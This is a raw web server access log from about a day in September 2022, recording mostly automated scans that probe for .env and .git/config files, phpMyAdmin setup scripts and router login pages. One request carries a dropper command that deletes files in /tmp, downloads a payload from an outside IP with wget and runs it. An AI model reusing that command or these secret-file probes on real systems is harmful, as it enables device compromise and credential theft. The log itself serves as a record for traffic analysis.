182.254.225.35 - - [09/Sep/2022:20:57:26 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
205.210.31.8 - - [09/Sep/2022:21:46:49 +0000] "\x16\x03\x01" 400 226 "-" "-"
198.98.59.132 - - [09/Sep/2022:22:12:54 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://35.178.166.217:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
201.150.174.125 - - [09/Sep/2022:22:32:59 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
18.216.3.117 - - [09/Sep/2022:23:00:00 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 8.0.0; F8331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36"
135.125.244.48 - - [09/Sep/2022:23:05:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:23:05:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
106.75.103.149 - - [09/Sep/2022:23:19:38 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
106.75.103.149 - - [09/Sep/2022:23:19:38 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:23:25:05 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [09/Sep/2022:23:25:05 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.9.174.64 - - [09/Sep/2022:23:53:24 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
95.214.235.205 - - [10/Sep/2022:00:00:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:00:00:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.126.82.157 - - [10/Sep/2022:00:48:13 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.126.82.157 - - [10/Sep/2022:00:48:13 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.126.82.157 - - [10/Sep/2022:00:48:13 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
135.125.244.48 - - [10/Sep/2022:00:50:12 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:00:50:12 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
138.68.76.15 - - [10/Sep/2022:01:04:46 +0000] "\x16\x03\x01" 400 226 "-" "-"
95.214.235.205 - - [10/Sep/2022:01:45:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:01:45:24 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.196.220.81 - - [10/Sep/2022:01:58:03 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://35.178.166.217:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0"
20.109.126.233 - - [10/Sep/2022:02:13:53 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.109.126.233 - - [10/Sep/2022:02:13:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
135.125.244.48 - - [10/Sep/2022:02:34:44 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:02:34:44 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.133.58 - - [10/Sep/2022:02:45:11 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:03:13:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:03:13:50 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:03:44:36 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:03:44:36 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.78.6.216 - - [10/Sep/2022:03:56:50 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
101.43.54.41 - - [10/Sep/2022:04:19:13 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.54.41 - - [10/Sep/2022:04:19:13 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.54.41 - - [10/Sep/2022:04:19:13 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.54.41 - - [10/Sep/2022:04:19:13 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
123.10.39.246 - - [10/Sep/2022:04:22:11 +0000] "POST /HNAP1/ HTTP/1.0" 400 226 "-" "-"
95.214.235.205 - - [10/Sep/2022:04:43:31 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:04:43:32 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:04:48:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:04:48:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.175.150 - - [10/Sep/2022:05:10:58 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.175.150 - - [10/Sep/2022:05:10:58 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:05:11:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:05:11:09 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.51 - - [10/Sep/2022:06:06:49 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
200.58.94.202 - - [10/Sep/2022:06:09:21 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
200.58.94.202 - - [10/Sep/2022:06:09:21 +0000] "POST /HNAP1/ HTTP/1.0" 400 226 "-" "-"
95.214.235.205 - - [10/Sep/2022:06:13:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:06:13:08 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.181.88.178 - - [10/Sep/2022:06:24:53 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.241.207.112 - - [10/Sep/2022:06:26:39 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
223.17.10.134 - - [10/Sep/2022:07:06:16 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
103.30.28.46 - - [10/Sep/2022:07:16:22 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.220.101.157 - - [10/Sep/2022:07:16:52 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
162.247.74.200 - - [10/Sep/2022:07:16:56 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
104.248.203.191 - - [10/Sep/2022:07:16:58 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
118.126.82.157 - - [10/Sep/2022:07:26:17 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.126.82.157 - - [10/Sep/2022:07:26:17 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.126.82.157 - - [10/Sep/2022:07:26:18 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [10/Sep/2022:07:43:53 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:07:43:53 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:07:55:47 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:07:55:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:08:31:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:08:31:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.209.162 - - [10/Sep/2022:08:32:40 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
43.143.58.236 - - [10/Sep/2022:08:41:30 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.143.58.236 - - [10/Sep/2022:08:41:30 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.143.58.236 - - [10/Sep/2022:08:41:30 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.143.58.236 - - [10/Sep/2022:08:41:30 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
62.171.182.70 - - [10/Sep/2022:09:09:36 +0000] "HEAD / HTTP/1.1" 200 - "-" "-"
95.214.235.205 - - [10/Sep/2022:09:12:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:09:12:51 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.143.49.112 - - [10/Sep/2022:10:00:35 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.143.49.112 - - [10/Sep/2022:10:00:35 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.143.49.112 - - [10/Sep/2022:10:00:35 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
43.143.49.112 - - [10/Sep/2022:10:00:35 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [10/Sep/2022:10:43:16 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:10:43:17 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.212.149 - - [10/Sep/2022:10:44:04 +0000] "MGLNDD_35.178.166.217_80\n" 400 226 "-" "-"
135.125.244.48 - - [10/Sep/2022:10:47:50 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:10:47:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:10:50:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:10:50:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
1.116.6.211 - - [10/Sep/2022:11:02:43 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
1.116.6.211 - - [10/Sep/2022:11:02:43 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
1.116.6.211 - - [10/Sep/2022:11:02:43 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
1.116.6.211 - - [10/Sep/2022:11:02:43 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
185.196.220.70 - - [10/Sep/2022:12:08:36 +0000] "GET / HTTP/1.1" 200 32 "-" "Linux Gnu (cow)"
95.214.235.205 - - [10/Sep/2022:12:14:30 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:12:14:30 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.139.68 - - [10/Sep/2022:12:18:55 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
20.169.89.0 - - [10/Sep/2022:12:20:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.169.89.0 - - [10/Sep/2022:12:20:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.139.80 - - [10/Sep/2022:12:23:23 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64"
201.238.154.196 - - [10/Sep/2022:12:41:56 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
201.238.154.196 - - [10/Sep/2022:12:41:56 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:12:52:51 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:12:52:51 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
168.90.15.154 - - [10/Sep/2022:13:19:16 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:13:40:18 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:13:40:18 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:13:42:53 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:13:42:53 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.43.55.216 - - [10/Sep/2022:15:03:00 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.55.216 - - [10/Sep/2022:15:03:00 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.55.216 - - [10/Sep/2022:15:03:00 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
101.43.55.216 - - [10/Sep/2022:15:03:00 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [10/Sep/2022:15:14:07 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:15:14:07 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.134.170 - - [10/Sep/2022:15:37:29 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:16:00:46 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:16:00:46 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:16:44:13 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:16:44:14 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:17:01:10 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:17:01:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.178.120.159 - - [10/Sep/2022:17:20:47 +0000] "GET / HTTP/1.1" 200 32 "http://35.178.166.217:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
95.214.235.205 - - [10/Sep/2022:18:14:35 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:18:14:35 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.138.44 - - [10/Sep/2022:18:15:08 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.44 - - [10/Sep/2022:18:15:19 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
135.125.244.48 - - [10/Sep/2022:18:15:55 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:18:15:55 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.195.252.158 - - [10/Sep/2022:18:56:22 +0000] "GET http://35.178.166.217:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.195.252.158 - - [10/Sep/2022:18:56:22 +0000] "GET http://35.178.166.217:80/pma/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.195.252.158 - - [10/Sep/2022:18:56:22 +0000] "GET http://35.178.166.217:80/db/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
118.195.252.158 - - [10/Sep/2022:18:56:22 +0000] "GET http://35.178.166.217:80/mysql/scripts/setup.php HTTP/1.0" 404 196 "-" "-"
95.214.235.205 - - [10/Sep/2022:19:45:46 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [10/Sep/2022:19:45:47 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:19:46:43 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:19:46:43 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.150 - - [10/Sep/2022:20:01:07 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.210.31.24 - - [10/Sep/2022:20:08:28 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.244.48 - - [10/Sep/2022:20:13:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [10/Sep/2022:20:13:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
